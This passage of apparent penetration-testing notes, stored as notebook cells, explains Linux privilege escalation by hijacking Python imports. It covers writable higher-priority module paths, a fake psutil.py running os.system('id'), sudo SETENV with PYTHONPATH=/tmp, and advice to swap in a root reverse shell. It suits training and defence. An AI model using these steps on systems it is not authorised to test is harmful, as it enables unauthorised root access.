    "Now run the script with sudo to see if the id of the root user is displayed. If this works, edit the library and insert a reverse shell that connects to the local machine as root to escalate privileges:\n",
    "```bash\n",
    "sudo /usr/bin/python3 ./<file.py>\n",
    "\n",
    "```\n",
    "\n",
    "**<u>Library Path</u>**\n",
    "\n",
    "In Python, each version has a specified order in which modules are searched and imported from. The order in which Python imports modules from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. This can be seen by issuing the following command:\n",
    "```bash\n",
    "python3 -c 'import sys; print(\"\\n\".join(sys.path))'\n",
    "\n",
    "```\n",
    "To use this variant, two prerequisites are necessary:\n",
    "1. The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable \n",
    "2. Write permissions to one of the paths having a higher priority on the list are required\n",
    "\n",
    "Therefore, if the imported module is located in a path lower on the list and a higher priority path is editable by the logged-in user, **a module can be created with the same name that includes malicious functions.** Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.\n",
    "\n",
    "For this to make sense, the previous script will be used that includes the psutil module. To see psutil's default installation location, use the following command:\n",
    "```bash\n",
    "pip3 show psutil | grep \"Location:\"\n",
    "\n",
    "```\n",
    "From this example, psutil is installed in the `/usr/local/lib/python3.8/dist-packages` path. From the listing of the PYTHONPATH variable, there may be several directories to choose from to see if there might be any misconfigurations in the environment that allow write access. Check with the following command:\n",
    "```bash\n",
    "ls -la /usr/lib/python3.8\n",
    "\n",
    "```\n",
    "After checking all of the directories listed, the `/usr/lib/python3.8` path may be misconfigued in a way to allow any user to write to it. Cross-check with values from the `PYTHONPATH` variable to see of the path is higher on the list than the path in which psutil is installed in. This misconfiguration can be abused to create a psutil module containing a malicious virtual_memory() function within the /usr/lib/python3.8 directory:\n",
    "```python\n",
    "#!/usr/bin/env python3\n",
    "import os\n",
    "\n",
    "def virtual_memory():\n",
    "   os.system('id')\n",
    "\n",
    "```\n",
    "In order to get to this point, a file named `psutil.py` must be creating containing the contents listed above in the previously mentioned directory. It is important to make sure that the created module has the same name as the import as well as having the same function with the correct number of arguments passed to it as the function that is going to be hijacked. This is critical as without either of these conditions being true, this attack will not work. After creating this file containing the example of the previous hijacking script, the system will be prepped for exploitation. Run the script again using sudo; if it works edit the file to create a reverse shell that connects to the local machine as root to escalate privileges:\n",
    "```bash\n",
    "sudo /usr/bin/python3 <file.py>\n",
    "\n",
    "```\n",
    "\n",
    "**<u>PYTHONPATH Environment Variable</u>**\n",
    "\n",
    "PYTHONPATH is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important because if a user is allowed to manipulate and set this variable while running the python binary, they can redirect Python's search functionality to a user-defined location when it comes time to import modules. To see if the logged-in user has the permissions to set environment variables for the Python binary, check the sudo permissions with `sudo -l`\n",
    "\n",
    "If `/usr/bin/python3` can be run with sudo privileges and NOPASSWD, the environment variables can be set by the `SETENV:` flag. Due to the trusted nature of sudo, any environment variables defined before calling the binary are not subject to any restrictions regarding being able to set environment variables, meaning that using the `/usr/bin/python3` binary enables setting environment variables under the context of a running program. \n",
    "\n",
    "Again, based on the previous script, the following command can be executed:\n",
    "```bash\n",
    "sudo PYTHONPATH=/tmp/ /usr/bin/python3 <file.py>\n",
    "\n",
    "```\n",
    "In this example, the previous python script was moved from the `/usr/lib/python3.8` directory to /tmp. At this point, the python3 binary was called to run the script; however, the PYTHONPATH variable is is contained in the /tmp directory so it forces Python to search that directory looking for the psutil module to import."
